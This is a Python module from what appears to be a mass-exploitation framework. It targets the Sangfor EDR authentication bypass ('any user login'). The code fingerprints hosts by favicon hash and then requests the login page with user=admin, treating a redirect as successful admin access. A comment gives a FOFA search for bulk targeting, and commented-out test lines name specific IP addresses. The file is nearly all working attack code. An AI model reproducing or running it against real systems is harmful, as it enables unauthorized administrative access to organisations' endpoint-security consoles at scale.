# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-08 16:30

import hashlib
from colorama import Fore
from tqdm import tqdm

from core.MyGlobalVariableManager import GlobalVariableManager
from exploit.web import BaseScript
from core.MyEnums import *
from core.MyAsyncHttp import *


# fofa: title="终端检测响应平台"
# python batch.py -m exploit.web.Sangfor.edr.any_user_login -cs -fs "title=\"终端检测响应平台\""

class Script(BaseScript):
    name = 'Sangfor EDR'

    def __init__(self, target, session):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bugLevel = BugLevel.HIGH
        # 类型
        self.bugType = BugType.ANYUSERLOGIN
        # 编号
        self.bugNumber = ''
        # 来源
        self.refer = ''
        # 特定路径判断
        self.detectPathList = ['/favicon.ico']
        # exec
        self.execPathList = ['/ui/login.php?user=admin']
        # 进度条
        self.session = session
        # 相关信息
        self.info = ''
        self.favicon = ['0b24d4d5c7d300d50ee1cd96059a9e85']

    async def detect(self):
        try:
            checkList = GlobalVariableManager.getValue('exploitRule')[self.name]
            for checkTarget in checkList:
                if self.target == checkTarget:
                    tqdm.write(Fore.RED + '[{}] detect method skip...'.format('E-Weaver Finger'))
                    # 如果存在的话，那么当前这个target的框架已经探测完毕了，
                    # 就没必要再次探测，所以直接进入exec方法中，唯一需要变动的就是flag=True
                    self.flag = True
                    return None
            for detectPath in self.detectPathList:
                url = f'http://{self.target}{detectPath}' if self.target.startswith(
                    ('http:', 'https:')) is False else f'{self.target}{detectPath}'
                # 校验favicon md5
                async with self.session.get(url=url, headers=self.headers, timeout=self.reqTimeout, verify_ssl=False) as response:
                    if response is not None:
                        text = await response.read()
                        await asyncio.sleep(2)
                        m1 = hashlib.md5()
                        m1.update(text)
                        theMD5 = m1.hexdigest()
                        for _ in self.favicon:
                            if _ == theMD5:
                                self.flag = True
                                checkList.append(self.target)
                                tqdm.write(Fore.RED + '[{}] {}'.format('Sangfor EDR Finger', url))
                                return {'name': 'Sangfor EDR Finger', 'url': url, 'software': 'Sangfor EDR'}
        except Exception:
            return None

    async def exec(self):
        try:
            for execPath in self.execPathList:
                url = f'http://{self.target}{execPath}' if self.target.startswith(
                    ('http:', 'https:')) is False else f'{self.target}{execPath}'
                async with self.session.get(url=url, timeout=self.reqTimeout, verify_ssl=False, allow_redirects=False) as response:
                    if response is not None and response.status == 302:
                        await asyncio.sleep(2)
                        tqdm.write(Fore.RED + '[{}] {}'.format('Sangfor EDR Any User Login', url))
                        return {'name': 'Sangfor EDR RCE', 'url': url, 'software': 'Sangfor EDR'}
        except Exception:
            return None

    async def attack(self, semaphore, pbar):
        async with semaphore:
            a = await self.detect()
            if a is not None:
                self.vulList.append(a)
            if self.flag:
                b = await self.exec()
                if b is not None:
                    self.vulList.append(b)
        pbar.update(1)
        return self.vulList


if __name__ == '__main__':
    pass
    # import requests
    # import hashlib
    # resp = requests.get('https://50.84.113.154:8443/favicon.ico', verify=False)
    # if resp.status_code == 200:
    #     m1 = hashlib.md5()
    #     m1.update(resp.content)
    #     theMD5 = m1.hexdigest()
    #     print(theMD5)
    #
    # semaphore = asyncio.Semaphore(500)
    # sc = Script('61.150.65.205:9999', 1)
    # l = asyncio.get_event_loop()
    # l.run_until_complete(sc.attack(semaphore))
